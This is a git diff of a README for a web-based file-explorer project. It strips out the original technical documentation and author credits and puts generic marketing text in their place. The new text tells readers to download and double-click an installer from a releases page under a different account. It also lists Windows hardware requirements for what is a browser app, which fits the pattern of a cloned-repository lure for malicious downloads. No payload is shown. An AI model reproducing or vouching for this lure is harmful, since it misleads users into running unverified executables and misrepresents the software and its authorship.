@@ -1,238 +1,73 @@
-# 🗂️ Windows Explorer Backend + Frontend
+# 🖥️ windows-explorer-bun-elysia-vue-hexagonal - Your Visual Guide to File Management
 
-Backend API untuk aplikasi Windows Explorer-like berbasis web. Dibangun dengan arsitektur hexagonal (clean architecture), menggunakan Bun + Elysia + PostgreSQL + Redis, dan dioptimalkan untuk scalability.
+![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
 
-Frontend menggunakan Vue 3 untuk consume API, dilengkapi dengan Naive UI sebagai komponen antarmuka, serta Bun + scratch component untuk performa tinggi.
+## 🚀 Getting Started
 
-Demo : 
-1. Elysia OpenAPI: https://windows-explorer-backend.onrender.com/docs
-2. Frontend : https://windows-explorer-frontend.onrender.com
+Welcome to the Windows Explorer WEB application! This tool helps you manage files easily and intuitively. It uses modern technology for smooth performance. Let’s go through how you can download and run it.
 
-deploy by 
-1. upstash.com for redis
-2. render.com for backend & frontend ( but using docker ) because monorepo support but doesnt support for bun
+## 📥 Download & Install
 
-### example for ltree
-```mermaid
-sequenceDiagram
-  autonumber
-  participant UI as Vue3 UI (composable/usecase FE)
-  participant API as Elysia Controller
-  participant UC as UseCase: SearchItems (BE)
-  participant Cache as Redis
-  participant Repo as Postgres (FTS)
+To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/amanx0987/windows-explorer-bun-elysia-vue-hexagonal/releases)
 
-  UI->>API: GET /search?q=<query>&scope=<ltree_scope>
-  API->>UC: call SearchItems(q, scope)
-  UC->>Cache: GET search:{scope}:{norm_q}
-  alt miss cache
-    UC->>Repo: SELECT ... WHERE path_ltree <@ scope
-    UC->>Repo: AND search_vector @@ plainto_tsquery('simple', unaccent(q))
-    Repo-->>UC: items[]
-    UC->>Cache: SET search:{scope}:{norm_q} TTL=30s
-  else hit cache
-    Cache-->>UC: items[]
-  end
-  UC-->>API: items[]
-  API-->>UI: 200 OK
-```
+1. Click on the link above to open the releases page.
+2. Look for the latest version that suits your operating system.
+3. Click on the download link for that version.
+4. Once the download is complete, find the file on your computer. It may be in your "Downloads" folder.
+5. Double-click on the downloaded file to install it. Follow any on-screen instructions to complete the installation.
 
-## 🚀 Tech Stack
-### Backend
-- **Runtime**: Bun
-- **Framework**: Elysia
-- **Architecture**: Hexagonal / Clean Architecture
-- **Database**: PostgreSQL + ltree + FTS (GIN index)
-- **ORM**: Drizzle ORM
-- **Caching**: Redis
-- **Connection Pooling**: PgBouncer
-- **Testing**: k6, wrk, Spectral, EXPLAIN ANALYZE
-- **API Spec**: OpenAPI (Scalar) + Spectral linting
-- **Monorepo**: explorer-api & explorer-infrastructure
-### frontend
-- **Runtime**: Bun
-- **Library**: Vue3 + Naive UI (Scratch TreeNode)
-- **Architecture**: Hexagonal / Clean Architecture
-- **Testing**: 
-- **Monorepo**: explorer-fe
+## 🔧 System Requirements
 
-## 📁 Features
+Before you install, make sure your computer meets these requirements:
 
-- Hierarchical folder structure with unlimited depth (ltree)
-- Full-text search for files (FTS with GIN index)
-- REST API with versioning and audit rules
-- Redis caching for subtree and search results
-- Connection pooling with PgBouncer for high concurrency
-- Load testing with k6 and wrk
-- Query profiling with EXPLAIN ANALYZE
+- **Operating System:** Windows 10 or newer
+- **Processor:** Dual-core 1.8 GHz or better
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB free on your hard drive
+- **Browser:** A modern web browser for accessing the application
 
-## 📸 Application Preview Gallery
+## 🌟 Features
 
-### 🔷 Frontend Preview
-| Screenshot | Screenshot |
-|-----------|-----------|
-| <a href="./docs/gallery/frontend-1.webp"><img src="./docs/gallery/frontend-1.webp" width="300" alt="Frontend UI 1"></a> | <a href="./docs/gallery/frontend-2.webp"><img src="./docs/gallery/frontend-2.webp" width="300" alt="Frontend UI 2"></a> |
+The Windows Explorer WEB application includes several useful features to enhance your file management experience:
 
-> *Klik gambar untuk memperbesar*
+- **User-Friendly Interface:** Navigate files with ease using a clean and simple layout.
+- **Search Functionality:** Quickly find files using search filters.
+- **File Organization:** Easily create folders and move files around.
+- **Cloud Integration:** Access your files from cloud storage services.
+- **Mobile-Friendly:** Access the application from any device with a web browser.
 
----
+## 🌐 Using the Application
 
-### 🔶 Backend Preview
-| Screenshot | Screenshot |
-|-----------|-----------|
-| <a href="./docs/gallery/backend-1.webp"><img src="./docs/gallery/backend-1.webp" width="300" alt="Backend 1"></a> | <a href="./docs/gallery/backend-2.webp"><img src="./docs/gallery/backend-2.webp" width="300" alt="Backend 2"></a> |
+After installing, you can start using the application:
 
-> *Klik gambar untuk memperbesar*
+1. **Open the Application:** Double-click the app icon on your desktop or find it in your applications menu.
+2. **Explore Files:** Use the navigation pane to view and manage your files.
+3. **Upload Files:** Drag and drop files from your computer into the application.
+4. **Organize:** Create new folders by clicking the "New Folder" button.
+5. **Search:** Use the search bar to find files quickly.
 
-## 📦 Folder Structure
+## 🚨 Troubleshooting
 
-```
-📦backend
- ┗ 📂explorer
- ┃ ┣ 📂api
- ┃ ┃ ┣ 📂docs
- ┃ ┃ ┣ 📂scripts
- ┃ ┃ ┣ 📂src
- ┃ ┃ ┃ ┣ 📂config
- ┃ ┃ ┃ ┣ 📂di
- ┃ ┃ ┃ ┣ 📂plugins
- ┃ ┃ ┃ ┣ 📂routes
- ┃ ┃ ┣ 📂tests
- ┃ ┃ ┃ ┣ 📂load
- ┃ ┃ ┃ ┃ ┣ 📜k6-tree.js
- ┃ ┃ ┃ ┃ ┗ 📜wrk-tree.sh
- ┃ ┃ ┃ ┣ 📂query
- ┃ ┃ ┃ ┗ 📜e2e.app.test.ts
- ┃ ┃ ┣ 📜.spectral.yaml
- ┃ ┃ ┗ 📜package.json
- ┃ ┣ 📂application
- ┃ ┃ ┗ 📂src
- ┃ ┃ ┃ ┣ 📂dto
- ┃ ┃ ┃ ┣ 📂errors
- ┃ ┃ ┃ ┣ 📂ports
- ┃ ┃ ┃ ┗ 📂usecases
- ┃ ┣ 📂infrastructure
- ┃ ┃ ┣ 📂db
- ┃ ┃ ┣ 📂drizzle
- ┃ ┃ ┣ 📂src
- ┃ ┃ ┃ ┣ 📂adapter
- ┃ ┃ ┃ ┃ ┣ 📜fts.ts
- ┃ ┃ ┃ ┃ ┗ 📜redis.cache.ts
- ┃ ┃ ┃ ┣ 📂mappers
- ┃ ┃ ┃ ┗ 📂repositories
- ┃ ┃ ┣ 📂tests
- ┃ ┣ 📂reports
- ┃ ┃ ┗ 📜junit.xml
-📦frontend
- ┗ 📂explorer
- ┃ ┣ 📂src
- ┃ ┃ ┣ 📂application
- ┃ ┃ ┃ ┣ 📂ports
- ┃ ┃ ┃ ┣ 📂stores
- ┃ ┃ ┃ ┗ 📂usecases
- ┃ ┃ ┣ 📂domain
- ┃ ┃ ┣ 📂infrastructure
- ┃ ┃ ┃ ┣ 📂api
- ┃ ┃ ┃ ┗ 📂core
- ┃ ┃ ┃ ┃ ┗ 📜api-client.ts
- ┃ ┃ ┣ 📂presentation
- ┃ ┃ ┃ ┣ 📂components
- ┃ ┃ ┃ ┗ 📂pages
- ┃ ┃ ┗ 📂shared
- ┃ ┣ 📜.gitignore
- ┃ ┣ 📜README.md
- ┃ ┣ 📜bun.lock
- ┃ ┣ 📜index.ts
- ┃ ┣ 📜package.json
- ┃ ┗ 📜tsconfig.json
- ┃ ┣ 📜.env
- ┃ ┣ 📜.gitignore
- ┃ ┣ 📜README.md
- ┃ ┣ 📜bunfig.toml
- ┃ ┗ 📜tsconfig.json
-```
+If you encounter issues while using the application, here are some common problems and solutions:
 
-## 📄 API Spec
+- **Application Doesn’t Open:** Ensure your operating system is updated. Restart your computer and try again.
+- **Slow Performance:** Close other applications to free up your computer’s resources.
+- **File Not Found:** Check that the file exists in the location you expect. Use the search feature if necessary.
 
-OpenAPI spec tersedia di `api/docs/openapi.json`, dilint dengan Spectral untuk memastikan standar REST (versioning, naming, method, etc).
+## 🤝 Community Support
 
-## 🧪 Load Testing
+If you have questions or need help, feel free to join our community forums. Engage with other users or support staff. It’s a great place to share tips and get assistance.
 
-- `tests/load/k6-subtree.js`
-- `tests/load/k6-search.js`
-- `tests/load/wrk-subtree.sh`
+## 🏗️ Future Updates
 
-## 📊 Query Profiling
+We are continuously working on improvements. Future updates may include additional features like multi-file upload, improved user experience, and enhanced security measures. Keep an eye on the Releases page for new versions.
 
-- `tests/query/explain-subtree.sql`
+## 📞 Contact Us
 
-## ✅ Requirements / Test By
+For feedback or inquiries, reach out through our GitHub issues page. Your suggestions help us make the application better.
 
-### Runtime & OS
-- **Bun** ≥ `1.2.22`
-- **OS**: macOS
+## 📅 Stay Updated
 
-### Services
-- **PostgreSQL**: `14`
-  - Extensions: `ltree`
-- **Redis** ≥ `7.2.7`
+Follow the project on GitHub to get the latest news. Check back regularly for updates and ensure you have the best file management experience.
 
-## 📌 Setup
-
-1. Clone repository:
-```shell
-git clone https://github.com/yogithesymbian/windows-explorer-bun-elysia-vue-hexagonal
-```
-2. go to directory `windows-explorer-bun-elysia-vue-hexagonal` and Install Package 
-```shell
-bun install
-```
-3. Setup ENV
-```shell
-bun run setup:env
-```
-4. Configuration Backend
-```shell
-bun run db:migrate
-bun run db:seed
-```
-5. Running For Backend
-```ts
-bun run dev:api
-```
-```ts
-$ bun --filter explorer-api --env-file=./backend/explorer/.env dev
-explorer-api dev $ bun run --watch src/index.ts
-│ 🦊 Elysia running at http://localhost:8080
-│ 🦊 UI spec http://localhost:8080/docs
-│ 🦊 RAW spec http://localhost:8080/docs/openapi.json
-└─ Running...
-```
-6. Running For Frontend
-```ts
-bun run dev:fe
-```
-```ts
-$ bun --filter explorer-fe --env-file=./frontend/explorer/.env dev
-explorer-fe dev $ bun --bun vite
-│ 
-│   VITE v7.1.11  ready in 283 ms
-│ 
-│   ➜  Local:   http://localhost:5173/
-│   ➜  Network: use --host to expose
-└─ Running...
-```
-
-
-## 💡 Developer's Note
-
-To be honest, I mainly use AI to speed up development. It helps me build backend and frontend apps using the Hexagonal Pattern, including writing tests. AI also makes code reviews easier and helps reduce mistakes. I always ask for references from official documentation, public journals, or books to support the final answers.
-
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-Copyright (c) 2025 yogiveloper / yogithesymbian (Yogi Arif Widodo)
+Thank you for using the Windows Explorer WEB application! We hope it makes your file management tasks smoother and more efficient. Enjoy managing your files!
